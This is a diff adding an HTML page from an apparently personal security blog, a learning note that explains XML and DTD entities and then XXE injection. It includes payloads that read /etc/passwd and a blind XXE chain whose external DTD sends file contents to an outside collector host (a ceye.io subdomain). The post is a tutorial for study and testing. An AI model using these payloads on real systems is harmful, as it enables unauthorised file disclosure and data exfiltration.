@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>
+        Threezh1&#39;Blog
+    </title>
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body id="bodyx">
+    <div class="hd posts">
+    <a href="/index.html"><i class="fa fa-reply replay-btn" aria-hidden="true"></i></a>
+    <div class="post-title">
+        <p>
+            了解XML
+        </p>
+        <hr>
+    </div>
+    <div class="post-content">
+        <!--Table of Contents begin-->
+        
+            <div id="toc" class="toc-article">
+            <strong class="toc-title">目录</strong>
+            <a class="js-toggle-toc" href="javascript:void(0)"></a>
+            <div class="toc-content">
+                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Simple-note%EF%BC%9A"><span class="toc-text">Simple note：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XML"><span class="toc-text">XML</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DTD"><span class="toc-text">DTD</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Try"><span class="toc-text">Try</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DIG"><span class="toc-text">DIG</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Normal-XXE"><span class="toc-text">Normal XXE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Blind-XXE-with-ceye-io"><span class="toc-text">Blind XXE with ceye.io:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XML-in-PHP%EF%BC%9A"><span class="toc-text">XML in PHP：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-text">Reference</span></a></li></ol>
+            </div>
+            </div>
+        
+        <!--Table of Contents end -->
+        <p>Learn：<a target="_blank" rel="noopener" href="http://www.w3school.com.cn/xml/xml_intro.asp">http://www.w3school.com.cn/xml/xml_intro.asp</a></p>
+<h2 id="Simple-note："><a href="#Simple-note：" class="headerlink" title="Simple note："></a>Simple note：</h2><h3 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h3><p>A simple example of XML：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1 ?&gt;</span><br><span class="line">&lt;skate&gt;</span><br><span class="line">	&lt;people  grade&#x3D;&quot;four&quot;&gt;</span><br><span class="line">		&lt;name&gt;azhu&lt;&#x2F;name&gt;</span><br><span class="line">		&lt;high&gt; three board &lt;&#x2F;high&gt;</span><br><span class="line">	&lt;&#x2F;people&gt;</span><br><span class="line">	&lt;people  grade&#x3D;&quot;one&quot;&gt;</span><br><span class="line">		&lt;name&gt;threezhi&lt;&#x2F;name&gt;</span><br><span class="line">		&lt;high&gt; three board &lt;&#x2F;high&gt;</span><br><span class="line">	&lt;&#x2F;people&gt;</span><br><span class="line">&lt;&#x2F;skate&gt;</span><br><span class="line"></span><br><span class="line">&#96;&lt;!-- You should avoid use attribute of XML. --&gt;&#96;</span><br></pre></td></tr></table></figure>
+<a id="more"></a>
+<p>In XML, there are five predefined entity reference(实体引用):</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;	&lt;</span><br><span class="line">&gt;	&gt;</span><br><span class="line">&amp;	&amp;</span><br><span class="line">&amp;apos;	&#39;</span><br><span class="line">&quot;	&quot;</span><br></pre></td></tr></table></figure>
+
+<p>A example of load an XML document to XML parser(解释器) :</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">if (window.XMLHttpRequest)</span><br><span class="line">&#123;&#x2F;&#x2F; code for IE7+, Firefox, Chrome, Opera, Safari</span><br><span class="line">	xmlhttp&#x3D;new XMLHttpRequest();</span><br><span class="line">&#125;else&#123;</span><br><span class="line">	&#x2F;&#x2F; code for IE6, IE5</span><br><span class="line">	xmlhttp&#x3D;new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">xmlhttp.open(&quot;GET&quot;,&quot;note.xml&quot;,false);</span><br><span class="line">xmlhttp.send();</span><br><span class="line">xmlDoc&#x3D;xmlhttp.responseXML;</span><br><span class="line"></span><br><span class="line">document.getElementById(&quot;to&quot;).innerHTML&#x3D;xmlDoc.getElementsByTagName(&quot;to&quot;)[0].childNodes[0].nodeValue;</span><br><span class="line">document.getElementById(&quot;from&quot;).innerHTML&#x3D;xmlDoc.getElementsByTagName(&quot;from&quot;)[0].childNodes[0].nodeValue;</span><br><span class="line">document.getElementById(&quot;message&quot;).innerHTML&#x3D;xmlDoc.getElementsByTagName(&quot;body&quot;)[0].childNodes[0].nodeValue;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h3><p>A example about DTD in XML:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1 ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE skate[</span><br><span class="line">	&lt;!ELEMENT people (name, high)&gt;</span><br><span class="line">	&lt;!ELEMENT name 		(#PCDATA)&gt; </span><br><span class="line">	&lt;!ELEMENT high 		(#PCDATA)&gt; </span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;skate&gt;</span><br><span class="line">	&lt;people  grade&#x3D;&quot;four&quot;&gt;</span><br><span class="line">		&lt;name&gt;azhu&lt;&#x2F;name&gt;</span><br><span class="line">		&lt;high&gt; three board &lt;&#x2F;high&gt;</span><br><span class="line">	&lt;&#x2F;people&gt;</span><br><span class="line">	&lt;people  grade&#x3D;&quot;one&quot;&gt;</span><br><span class="line">		&lt;name&gt;threezhi&lt;&#x2F;name&gt;</span><br><span class="line">		&lt;high&gt; three board &lt;&#x2F;high&gt;</span><br><span class="line">	&lt;&#x2F;people&gt;</span><br><span class="line">&lt;&#x2F;skate&gt;</span><br></pre></td></tr></table></figure>
+
+<p>External document declaration:</p>
+<p><code>&lt;!DOCTYPE skate SYSTEM &quot;file_path&quot;&gt;</code></p>
+<p>PCDATA means parsed character data. The tags in the text will be handled as a flag and the entity will be expand.</p>
+<p>CDATA means character data and it will not be expand.</p>
+<p>In DTD , declare an element and a attribute.:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT Element_name category&gt;</span><br><span class="line">&lt;!ELEMENT Element_name (content)&gt;</span><br><span class="line">&lt;!ELEMENT Element_name (Elemnt1, Element2...)&gt;</span><br><span class="line"></span><br><span class="line">Empty Element:</span><br><span class="line">&lt;!ELEMENT Element_name, EMPTY&gt;</span><br><span class="line"></span><br><span class="line">An element who just have PCDATA should use #PCDATA to declare.</span><br><span class="line"></span><br><span class="line">&lt;!ATTLIST name type category defaults&gt;</span><br><span class="line">&lt;!ATTLIST payment type CDATA &quot;check&quot;&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>DTD - Entity(实体):</p>
+<p>A entity declare:</p>
+<p>Internal entity:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">DTD:</span><br><span class="line">&lt;!ENTITY name &quot;value&quot;&gt;</span><br><span class="line">&lt;!ENTITY writer &quot;Bill Gates&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;</span><br><span class="line"></span><br><span class="line">XML:</span><br><span class="line">&lt;author&gt;&amp;writer;&amp;copyright;&lt;&#x2F;author&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>External entity:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">DTD:</span><br><span class="line">&lt;!ENTITY writer SYSTEM &quot;http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;dtd&#x2F;entities.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright SYSTEM &quot;http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;dtd&#x2F;entities.dtd&quot;&gt;</span><br><span class="line"></span><br><span class="line">XML:</span><br><span class="line">&lt;author&gt;&amp;writer;&amp;copyright;&lt;&#x2F;author&gt;</span><br></pre></td></tr></table></figure>
+
+<p>Parameter entity:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY %entity_name &quot;value&quot;&gt;</span><br><span class="line">&lt;!ENTITY %entity_name SYSTEM &quot;URL&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Try"><a href="#Try" class="headerlink" title="Try"></a>Try</h2><p>This is a internal entity:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot; ?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span>[</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ELEMENT <span class="meta-keyword">note</span> (<span class="meta-keyword">name</span>)&gt;</span> </span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY <span class="meta-keyword">fuck</span> <span class="meta-string">&quot;You&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;fuck;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>I don’t know why that I can’t build a xml within external entity successfully. So I wanan put it away in this time.</p>
+<h2 id="DIG"><a href="#DIG" class="headerlink" title="DIG"></a>DIG</h2><p>When there is a post , it made up by xml. And the parameter can be control. Mybe there hava a XXE vluntery.</p>
+<p>We can use some simple xml to test it.</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span>[</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY <span class="meta-keyword">foo</span> <span class="meta-string">&quot;Testing&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">parameter</span>&gt;</span><span class="symbol">&amp;foo;</span><span class="tag">&lt;/<span class="name">parameter</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>If it return “Testing”. We can use another to get more information.</p>
+<h3 id="Normal-XXE"><a href="#Normal-XXE" class="headerlink" title="Normal XXE"></a>Normal XXE</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY <span class="meta-keyword">test</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">c</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">c</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>Parameter entity:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY % <span class="meta-keyword">test</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">	%test;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>If the website return nothing , There is another mean to deal with this problem.</p>
+<p>Use external entity:</p>
+<p>XML:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY <span class="meta-keyword">test</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://127.0.0.1/shell.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">c</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">c</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>DTD:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY foo SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Blind-XXE-with-ceye-io"><a href="#Blind-XXE-with-ceye-io" class="headerlink" title="Blind XXE with ceye.io:"></a>Blind XXE with ceye.io:</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://ip.port.b182oj.ceye.io/xxe_test&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>/&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>We can create a dtd to get echo result(回显结果).</p>
+<p>XML:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY % <span class="meta-keyword">payload</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY % <span class="meta-keyword">dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://*.*.*.*:8080/xml/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">	%dtd;</span></span><br><span class="line"><span class="meta">	%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>DTD:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!ENTITY % all </span><br><span class="line">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http:&#x2F;&#x2F;ip.port.b182oj.ceye.io&#x2F;?xml1&#x3D;%payload;&#39;&gt;&quot;</span><br><span class="line">&gt;%all;</span><br></pre></td></tr></table></figure>
+
+<p>If the XEE is exist, ceye will get a GET request.</p>
+<p>Of course there are many means to get important and private information. But due to my ability, I wanna put it down to learn more important things.</p>
+<h3 id="XML-in-PHP："><a href="#XML-in-PHP：" class="headerlink" title="XML in PHP："></a>XML in PHP：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$xml</span>=simplexml_load_file(<span class="string">&quot;note.xml&quot;</span>);</span><br><span class="line">print_r(<span class="variable">$xml</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul>
+<li><a target="_blank" rel="noopener" href="http://hu3sky.ooo/2018/06/29/xxe%E5%AD%A6%E4%B9%A0/#%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93">hu3sky’blog(There is a poc about how to probe intranet)</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/195899.html?tdsourcetag=s_pctim_aiomsg">使用本地DTD文件来利用XXE漏洞实现任意结果输出</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/126788.html">浅谈XXE攻击</a></li>
+<li><a target="_blank" rel="noopener" href="https://security.tencent.com/index.php/blog/msg/69">XXE漏洞攻防</a></li>
+<li><a target="_blank" rel="noopener" href="http://www.anquan.us/static/bugs/wooyun-2016-0205725.html">中国电信某省系统Blink XXE</a></li>
+<li><a target="_blank" rel="noopener" href="http://www.anquan.us/static/bugs/wooyun-2016-0203510.html">搜狐焦点主站Blind XXE利用Cloudeye神器测试</a></li>
+<li><a target="_blank" rel="noopener" href="http://www.anquan.us/static/bugs/wooyun-2016-0203048.html">利用网易一处XXE盲注演示如何通过cloudeye配合实现文件内容读取</a></li>
+<li><a target="_blank" rel="noopener" href="http://www.anquan.us/static/bugs/wooyun-2016-0189058.html">汉启科技智能邮件系统一个XXE文件读取引发的血案</a></li>
+<li><a target="_blank" rel="noopener" href="http://www.anquan.us/static/bugs/wooyun-2016-0166751.html">Xfire文件读取漏洞(…Service?wsdl)</a></li>
+<li><a target="_blank" rel="noopener" href="http://www.anquan.us/static/bugs/wooyun-2015-0122544.html">XXE &amp; SQL 方维O2O商业系统SQL注入漏洞+XXE实体注入 </a></li>
+<li><a target="_blank" rel="noopener" href="http://www.anquan.us/static/bugs/wooyun-2015-0117316.html">    用友人力资源管理软件全版本XXE漏洞 (XXE FUZZ)</a></li>
+<li>[From blind XXE to root-level file read access]<a target="_blank" rel="noopener" href="https://www.honoki.net/2018/12/from-blind-xxe-to-root-level-file-read-access/">https://www.honoki.net/2018/12/from-blind-xxe-to-root-level-file-read-access/</a></li>
+</ul>
+
+    </div>
+
+    
+</div>
+    <div class="footer" id="footer">
+    <p>Copyright © 2020 Threezh1
+        <!-- <label class="el-switch el-switch-green el-switch-sm" style="vertical-align: sub;">
+            <input type="checkbox" name="switch" id="update_style">
+            <span class="el-switch-style"></span>
+        </label> -->
+<!--         <script type="text/javascript">
+        var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");
+        document.write(unescape("%3Cspan id='cnzz_stat_icon_1278548644'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "v1.cnzz.com/stat.php%3Fid%3D1278548644%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
+        </script> -->
+    </p>
+</div>
+<input type="hidden" id="web_style" value="black">
+<input type="hidden" id="valine_appid" value="CmCti21ooOOIzFOhEyFkFvR0-gzGzoHsz">
+<input type="hidden" id="valine_appKey" value="FqiyUqbg7McKN2eG0MCewupf">
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/libs/highlight/highlight.pack.js"></script>
+
+<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
+
+<script src="/js/js.js"></script>
+
+<style type="text/css">
+.v * {
+    color: #698fca;
+}
+
+.v .vlist .vcard .vhead .vsys {
+    color: #3a3e4a;
+}
+
+.v .vlist .vcard .vh .vmeta .vat {
+    color: #638fd5;
+}
+
+.v .vlist .vcard .vhead .vnick {
+    color: #6ba1ff;
+}
+
+.v a {
+    color: #8696b1;
+}
+
+.v .vlist .vcard .vhead .vnick:hover {
+    color: #669bfc;
+}
+</style>
+</body>
+
+</html>
